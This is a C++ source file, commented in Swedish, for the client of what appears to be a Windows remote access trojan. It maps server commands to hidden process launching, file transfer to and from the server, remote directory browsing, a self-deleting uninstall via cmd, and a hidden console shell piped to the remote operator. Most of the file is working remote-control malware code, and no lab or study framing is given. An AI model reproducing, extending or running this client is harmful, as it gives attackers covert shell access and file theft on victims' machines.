#pragma once
#include "precompile.h"
#include "client.h"
#include "shell_process.h"
#include "payloads.h"

response_table client::get_responses()
{
	return {
		{"process-v", payload::process_execution_show}, // för att starta en process
		{"process-h", payload::process_execution_hidden}, // för att starta en gömd process
		{"download", payload::download_file} // för att över föra en fil till servern
	};
}

action_table client::get_actions()
{
	return {
		{"exit", [&](std::string data) { exit(0); }}, // för att stänga ner klienten
		{"uninstall", [&](std::string) { // för att avinstallera klienten
			payload::process_execution(R"("C:\Windows\System32\cmd.exe" /K timeout /t 2 && del )" + std::filesystem::current_path().string() + "\\client.exe", true); exit(0);
		}},
		{"select", [&](std::string data) { // för att välja fil/mapp åt servern
			directory manager(data); //antag data är bas directory
			helper::send_directory(client_implementation, manager.current_directory()); // skicka bas mappen

			packet paket = client_implementation.receive_packet(); // ta emot respons
			while (paket.id != "dir_action" && paket.data != "done") { // medans server inte är klar, klienten kommer aldrig att fastna i den här loppen eftersom att den kallar recv vilket gör att den kan ominitializera instansen
				std::cout << "recv()[" << paket.id << "|" << paket.data << "]" << std::endl;
				if (!paket.id.empty() && !paket.data.empty()) { // paketet inte är tomt
					if (paket.id == "goto" && std::all_of(paket.data.begin(), paket.data.end(), isdigit)) { // om vi ska gå in i en undermapp
						helper::send_directory(client_implementation, manager.descend(std::stoi(paket.data))); // gå in och skicka undermappen
					}
				}
				paket = client_implementation.receive_packet(); // ta emot nästa instruktion från servern
			}
		}},
		{"upload", [&](std::string data) {
			auto [file, folder] = helper::ArgSplit(data, '|');
			std::ofstream output(folder + "\\" + std::filesystem::path(file).filename().string(), std::ios::binary); // öppna en filen som ska motas

			if (output.good()) { // om det går att öppna filen på den platsen
				client_implementation.send({ "upload_status", "Ok" });
			}
			else { // annars går det inte att öppna pga kanske fel ägare av mappen eller skrivrättigheter
				client_implementation.send({ "upload_status", ":<" });
				return;
			}

			packet file_data = client_implementation.receive_packet(); // ta emot filen

			output << file_data.data; // skriv filen

			output.close(); // stäng filen
			
		}},
		{"shell-init", [&](std::string data)
		{
			auto [shell, cwd] = helper::ArgSplit(data, '|');

			properties prop{
				shell,
				cwd,
				CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP,
				STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
				SW_HIDE,
				true
			};

			shell_process process(prop);

			if (process.open()) {
				client_implementation.send({"shell-status", "OK"});
				std::cout << "shell-process(" << data << ") -> " << Error(0) << std::endl;

				bool got_input = true;

				std::thread read_pipe(&shell_process::read, process, [&](std::string data) {
					if (process.ready() && got_input) {
						client_implementation.send({ "shell-ready", "ready" });
						got_input = false;
					}
					if (!data.empty()) {
						client_implementation.send({"shell-read", data});
					}
				});

				while(process.alive()){
					packet input = client_implementation.receive_packet();
					if (input.id == "shell-input" && input.data != "<cbreak>") {
						process.write(input.data);
					}
					else{
						process.ctrl_c();
					}
					got_input = true;
				}

				read_pipe.join();

				client_implementation.send({ "shell-status", "died" });
				client_implementation.send({ "shell-ready", "died" });
			}
			else {
				auto error = std::error_code(GetLastError(), std::system_category());
				std::cout << data << " -> " << error << std::endl;;
				client_implementation.send({"shell-status", std::to_string(error.value()) + " -> " + error.message()});
				return;
			}
		}}
	};
}